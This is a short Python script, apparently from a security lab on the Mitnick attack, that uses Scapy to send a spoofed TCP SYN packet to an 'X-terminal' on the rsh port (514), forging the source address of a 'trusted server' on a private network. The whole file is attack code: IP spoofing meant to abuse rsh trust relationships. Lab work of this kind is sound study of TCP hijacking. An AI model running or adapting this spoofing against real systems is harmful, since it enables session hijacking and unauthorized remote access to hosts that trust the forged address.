#!/usr/bin/env python3

from scapy.all import IP, TCP, send

print("Sending Spoofed SYN packet to X-terminal (victim)")
ip = IP(src="192.168.12.6", dst="192.168.12.5")  # Trusted server -> X-terminal
# Trusted server port -> X-terminal port; S = SYN packet flag.
tcp = TCP(sport=1023, dport=514, flags="S", seq=123456789)
pkt = ip / tcp
send(pkt, verbose=0)
